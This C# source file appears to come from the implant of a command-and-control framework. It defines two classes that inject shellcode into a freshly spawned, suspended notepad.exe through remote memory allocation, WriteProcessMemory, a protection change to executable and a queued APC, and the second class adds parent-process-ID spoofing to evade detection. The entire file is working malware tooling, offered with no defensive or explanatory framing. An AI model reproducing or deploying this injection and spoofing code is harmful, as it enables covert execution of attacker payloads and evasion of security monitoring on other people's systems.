using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using System.Runtime.InteropServices;
namespace Agent.Internal
{
    class SpawnInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0, string exeToRun = @"C:\windows\system32\notepad.exe")
        {
            var si = new Native.Kernel32.STARTUPINFO();
            if (!Native.Kernel32.CreateProcess(exeToRun, null, IntPtr.Zero, IntPtr.Zero, false, (uint)Native.Kernel32.CreationFlags.Suspended, IntPtr.Zero, @"C:\windows\system32", ref si, out var pi))
                return false;

            var baseAddr = Native.Kernel32.VirtualAllocEx(
              pi.hProcess,
              IntPtr.Zero,
              (uint)shellcode.Length,
              (uint)Native.Kernel32.AllocationType.MEM_COMMIT | (uint)Native.Kernel32.AllocationType.MEM_RESERVE,
              (uint)Native.Kernel32.AllocationProtect.PAGE_READWRITE);

            if (baseAddr == IntPtr.Zero)
                return false;

            if (!Native.Kernel32.WriteProcessMemory(
                pi.hProcess,
                baseAddr,
                shellcode,
                shellcode.Length,
                out _))
                return false;

            if (!Native.Kernel32.VirtualProtectEx(pi.hProcess, baseAddr, shellcode.Length, (uint)Native.Kernel32.AllocationProtect.PAGE_EXECUTE_READ, out _))
                return false;

            Native.Kernel32.QueueUserAPC(baseAddr, pi.hThread, IntPtr.Zero);
            var result = Native.Kernel32.ResumeThread(pi.hThread);
            return result > 0;

        }
    }
    public class SpawnInjectorPPID : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0, string exeToRun = @"C:\windows\system32\notepad.exe")
        {
            // setup siEx
            Native.Kernel32.STARTUPINFO si = new Native.Kernel32.STARTUPINFO();
            Native.Kernel32.STARTUPINFOEX siEx = new Native.Kernel32.STARTUPINFOEX();
            si.cb = Marshal.SizeOf(siEx);
            siEx.StartupInfo = si;
            Native.Kernel32.PROCESS_INFORMATION pi = new Native.Kernel32.PROCESS_INFORMATION();
            IntPtr lpAttributeList = Internal.Impersonator.ParentProcessIDSpoof(pid);
            if (lpAttributeList == IntPtr.Zero) { return false; }
            siEx.lpAttributeList = lpAttributeList;
            bool res = CreateProcess(null, exeToRun, IntPtr.Zero, IntPtr.Zero, false, 0x08080004, IntPtr.Zero, null, ref siEx, out pi);
            if (!res) { return false; }
            var baseAddr = Native.Kernel32.VirtualAllocEx(
              pi.hProcess,
              IntPtr.Zero,
              (uint)shellcode.Length,
              (uint)Native.Kernel32.AllocationType.MEM_COMMIT | (uint)Native.Kernel32.AllocationType.MEM_RESERVE,
              (uint)Native.Kernel32.AllocationProtect.PAGE_READWRITE);

            if (baseAddr == IntPtr.Zero)
                return false;

            if (!Native.Kernel32.WriteProcessMemory(
                pi.hProcess,
                baseAddr,
                shellcode,
                shellcode.Length,
                out _))
                return false;

            if (!Native.Kernel32.VirtualProtectEx(pi.hProcess, baseAddr, shellcode.Length, (uint)Native.Kernel32.AllocationProtect.PAGE_EXECUTE_READ, out _))
                return false;

            Native.Kernel32.QueueUserAPC(baseAddr, pi.hThread, IntPtr.Zero);
            var result = Native.Kernel32.ResumeThread(pi.hThread);
            return result > 0;

        }
        //create process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CreateProcess(
           string lpApplicationName,
           string lpCommandLine,
           IntPtr lpProcessAttributes,
           IntPtr lpThreadAttributes,
           bool bInheritHandles,
           uint dwCreationFlags,
           IntPtr lpEnvironment,
           string lpCurrentDirectory,
           [In] ref Native.Kernel32.STARTUPINFOEX lpStartupInfo,
           out Native.Kernel32.PROCESS_INFORMATION lpProcessInformation);
    }
}
